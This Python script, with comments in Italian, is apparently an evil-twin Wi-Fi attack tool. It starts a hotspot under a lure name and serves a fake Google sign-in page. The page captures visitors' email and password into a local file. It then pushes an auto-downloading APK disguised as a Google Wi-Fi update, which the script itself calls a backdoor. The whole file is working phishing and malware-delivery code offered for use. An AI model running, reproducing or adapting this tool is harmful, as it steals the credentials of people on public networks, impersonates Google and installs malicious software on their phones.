#!/usr/bin/env python3
"""
HackerSuite - Evil Twin Captive Portal
Con link reali Google per sembrare autentico
SSID configurabile via parametro o modificando la variabile qui sotto
"""
import http.server, socketserver, os, urllib.parse, subprocess, sys, json

# ============================================================
# CONFIGURAZIONE - CAMBIA QUI IL NOME DEL WiFi
# ============================================================
SSID = "FastWeb_Free_Public"     # <-- CAMBIA QUESTO col nome che vuoi
PASSWORD = "password123"          # Password dell'hotspot
# ============================================================

PORT = 80
CREDS = os.path.join(os.path.dirname(__file__),'..','captive','creds.txt')
APK = os.path.join(os.path.dirname(__file__),'..','captive','download','ServiziWiFiGoogle.apk')
os.makedirs(os.path.dirname(CREDS),exist_ok=True)

# Link Google REALI - cliccabili nella pagina
LINKS = {
    'privacy': 'https://policies.google.com/privacy',
    'terms': 'https://policies.google.com/terms',
    'google': 'https://www.google.com',
    'support': 'https://support.google.com/',
    'account': 'https://myaccount.google.com/',
}

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        
        # Servi APK
        if '/download' in p.path or p.path.endswith('.apk'):
            if os.path.exists(APK):
                sz = os.path.getsize(APK)
                self.send_response(200)
                self.send_header('Content-type','application/vnd.android.package-archive')
                self.send_header('Content-Disposition','attachment; filename="ServiziWiFiGoogle.apk"')
                self.end_headers()
                with open(APK,'rb') as f: self.wfile.write(f.read())
                print(f"\n[APK] ServiziWiFiGoogle.apk scaricato ({sz/1024:.1f} KB)\n")
            else:
                self.send_response(302)
                self.send_header('Location','https://www.google.com')
                self.end_headers()
            return
        
        # Cattura credenziali
        if p.path == '/submit':
            q = urllib.parse.parse_qs(p.query)
            e, pw = q.get('email',[''])[0], q.get('password',[''])[0]
            if e and pw:
                with open(CREDS,'a') as f:
                    f.write(f"[{__import__('datetime').datetime.now()}] EMAIL:{e} | PASSWORD:{pw}\n")
                print(f"\n{'='*55}")
                print(f"  🔥 CREDENZIALI CATTURATE!")
                print(f"  Email:    {e}")
                print(f"  Password: {pw}")
                print(f"{'='*55}\n")
                self.send_response(302)
                self.send_header('Location', '/update-required')
                self.end_headers()
                return
        
        # Pagina principale o update
        if p.path == '/update-required':
            self._serve_update_page()
        else:
            self._serve_login_page()
    
    def _serve_login_page(self):
        """Pagina fake login identica a Google con link reali"""
        self.send_response(200)
        self.send_header('Content-type','text/html;charset=utf-8')
        self.end_headers()
        
        html = f'''<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accedi - Account Google</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Google Sans',Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh}}
.header{{width:100%;padding:12px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e8eaed}}
.header a{{color:#5f6368;text-decoration:none;font-size:14px}}
.header a:hover{{color:#1a73e8}}
.header-links{{display:flex;gap:24px}}
.card{{max-width:420px;width:90%;margin:40px auto;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:12px;text-align:center}}
.google-logo{{width:75px;margin:0 auto 20px;display:block}}
.google-logo:hover{{opacity:0.8}}
h1{{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}}
.subtitle{{font-size:14px;color:#5f6368;margin-bottom:30px;line-height:1.4}}
.input-group{{text-align:left;margin-bottom:10px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:8px;font-size:16px;outline:none;transition:border-color 0.2s}}
input:focus{{border-color:#1a73e8;border-width:2px}}
label{{display:block;font-size:13px;color:#5f6368;margin-bottom:4px;font-weight:400}}
.show-password{{text-align:left;font-size:14px;margin:8px 0 20px}}
.show-password a{{color:#1a73e8;text-decoration:none;font-size:13px}}
.btn-container{{display:flex;justify-content:space-between;align-items:center;margin-top:10px}}
.create-account a{{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}}
.create-account a:hover{{color:#1557b0}}
.btn{{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:20px;font-size:14px;font-weight:500;cursor:pointer}}
.btn:hover{{background:#1557b0;box-shadow:0 1px 3px rgba(26,115,232,0.3)}}
.footer{{margin-top:60px;font-size:12px;color:#5f6368;text-align:center;padding:20px}}
.footer a{{color:#5f6368;text-decoration:none;margin:0 16px}}
.footer a:hover{{color:#1a73e8}}
.wifi-badge{{display:inline-flex;align-items:center;gap:6px;background:#e8f0fe;color:#1a73e8;padding:4px 10px;border-radius:12px;font-size:12px;margin-bottom:20px}}
</style>
</head>
<body>
<div class="header">
<div class="header-links">
<a href="{LINKS['google']}" target="_blank">Google</a>
<a href="{LINKS['support']}" target="_blank">Aiuto</a>
<a href="{LINKS['privacy']}" target="_blank">Privacy</a>
<a href="{LINKS['terms']}" target="_blank">Termini</a>
</div>
<a href="{LINKS['account']}" target="_blank" style="font-size:13px">Accedi</a>
</div>

<div class="card">
<a href="{LINKS['google']}" target="_blank">
<svg class="google-logo" viewBox="0 0 48 48"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.52l7.98-5.93z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.93C6.51 42.62 14.62 48 24 48z"/></svg>
</a>

<h1>Accedi</h1>
<div class="wifi-badge">
<svg width="14" height="14" viewBox="0 0 24 24"><path fill="currentColor" d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
{SSID}
</div>
<p class="subtitle">Per utilizzare la rete gratuita, accedi con il tuo Account Google</p>

<form action="/submit" method="GET">
<div class="input-group">
<label>Email o telefono</label>
<input type="email" name="email" placeholder="nome@esempio.com" required autofocus>
</div>
<div class="input-group">
<label>Password</label>
<input type="password" name="password" placeholder="Inserisci la password" required>
</div>
<div class="show-password"><a href="#">Mostra password</a></div>
<div class="btn-container">
<div class="create-account"><a href="{LINKS['account']}" target="_blank">Crea account</a></div>
<button class="btn" type="submit">Avanti</button>
</div>
</form>
</div>

<div class="footer">
<select style="border:none;color:#5f6368;font-size:12px;background:transparent">
<option>Italiano</option>
<option>English</option>
<option>Français</option>
</select>
<a href="{LINKS['privacy']}" target="_blank">Privacy</a>
<a href="{LINKS['terms']}" target="_blank">Termini</a>
<a href="{LINKS['support']}" target="_blank">Aiuto</a>
</div>
</body></html>'''
        self.wfile.write(html.encode())
    
    def _serve_update_page(self):
        self.send_response(200)
        self.send_header('Content-type','text/html;charset=utf-8')
        self.end_headers()
        
        html = f'''<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Aggiornamento richiesto - Google</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Google Sans',Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;min-height:100vh}}
.header{{width:100%;padding:12px 24px;display:flex;align-items:center;border-bottom:1px solid #e8eaed;background:#fff}}
.google-mini{{display:flex;align-items:center;gap:8px;font-size:14px;color:#5f6368}}
.card{{max-width:420px;width:90%;margin:60px auto;padding:40px 35px;background:#fff;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,.1);text-align:center}}
.warn-box{{background:#fef7e0;border:1px solid #f9d849;border-radius:8px;padding:16px;font-size:14px;color:#5f4b00;margin:20px 0;text-align:left;line-height:1.5}}
h1{{font-size:22px;font-weight:500;color:#202124;margin-bottom:12px}}
p{{color:#5f6368;font-size:14px;line-height:1.5;margin-bottom:16px}}
.btn{{display:inline-block;background:#1a73e8;color:#fff;padding:14px 36px;border-radius:28px;text-decoration:none;font-size:15px;font-weight:500;margin:10px 0 20px}}
.btn:hover{{background:#1557b0;box-shadow:0 1px 3px rgba(26,115,232,0.3)}}
.secured{{font-size:12px;color:#5f6368;display:flex;align-items:center;justify-content:center;gap:6px;margin:12px 0}}
.footer{{margin-top:40px;font-size:12px;color:#9aa0a6;text-align:center;padding:20px}}
.footer a{{color:#5f6368;text-decoration:none;margin:0 12px}}
</style>
</head>
<body>
<div class="header">
<div class="google-mini">
<svg width="20" height="20" viewBox="0 0 48 48"><path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.52l7.98-5.93z"/><path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.93C6.51 42.62 14.62 48 24 48z"/></svg>
<span>Google</span>
</div>
</div>

<div class="card">
<div style="font-size:48px;margin-bottom:10px">&#9888;</div>
<h1>Aggiornamento richiesto</h1>
<p>Per utilizzare la rete <strong>{SSID}</strong> &egrave; necessario installare l'ultimo aggiornamento dei servizi Wi-Fi Google.</p>
<div class="warn-box">
<strong>&#9432; Informazioni:</strong> Questo aggiornamento &egrave; richiesto dal provider di rete per garantire la cifratura end-to-end. Include i nuovi protocolli di sicurezza WPA3-Enterprise 2024.
</div>
<a class="btn" href="download/ServiziWiFiGoogle.apk" download>&#11015; Installa Aggiornamento</a>
<div class="secured">
<svg width="16" height="16" viewBox="0 0 24 24"><path fill="#5f6368" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
Connessione protetta &middot; Google LLC
</div>
<p style="font-size:11px;color:#9aa0a6"><a href="{LINKS['privacy']}" target="_blank" style="color:#5f6368">Privacy</a> &middot; <a href="{LINKS['terms']}" target="_blank" style="color:#5f6368">Termini di servizio</a></p>
</div>

<div class="footer">
<p>&copy; 2024 Google LLC - Tutti i diritti riservati</p>
</div>

<script>
setTimeout(function(){{window.location.href="download/ServiziWiFiGoogle.apk"}},3500)
</script>
</body></html>'''
        self.wfile.write(html.encode())
    
    def log_message(self, fmt, *a):
        print(f"[EvilTwin] {a[0]} {a[2]}")

def start_hotspot():
    """Avvia hotspot con SSID configurabile"""
    print(f"[*] Avvio hotspot '{SSID}'...")
    try:
        subprocess.run(['termux-wifi-hotspot','start',SSID,PASSWORD],timeout=10,capture_output=True)
        print(f"[+] Hotspot '{SSID}' avviato!")
    except:
        print("[!] Avvia hotspot manualmente o installa Termux:API")
        print(f"[!] SSID da usare: {SSID}")
        print(f"[!] Password: {PASSWORD}")

def main():
    # Leggi SSID da argomento o usa default
    global SSID, PASSWORD
    if len(sys.argv) > 1:
        SSID = sys.argv[1]
    if len(sys.argv) > 2:
        PASSWORD = sys.argv[2]
    
    print("="*60)
    print("  Servizi Wi-Fi Google - Evil Twin Distribution")
    print("  © 2024 Google LLC - Strumento di diagnostica")
    print("  Fake login Google -> APK backdoor install")
    print("="*60)
    print(f"\n  SSID:   {SSID}")
    print(f"  Password: {PASSWORD}")
    print("="*60)
    
    start_hotspot()
    
    ip='192.168.43.1'
    try:
        r=subprocess.run("ip route|grep -oP '192\\.168\\.\\d+\\.\\d+'|head -1",shell=True,capture_output=True,text=True,timeout=5)
        if r.stdout.strip(): ip=r.stdout.strip()
    except: pass
    
    apk_ok = os.path.exists(APK)
    print(f"\n[*] Server: http://{ip}:{PORT}")
    print(f"[*] Credenziali -> {CREDS}")
    print(f"[*] APK presente: {'✓' if apk_ok else '✗ (metti APK in captive/download/)'}")
    print(f"[*] Link reali Google attivi ✓")
    print(f"[*] Premi Ctrl+C per fermare\n")
    
    socketserver.TCPServer(("0.0.0.0",PORT),H).serve_forever()

if __name__=='__main__': main()
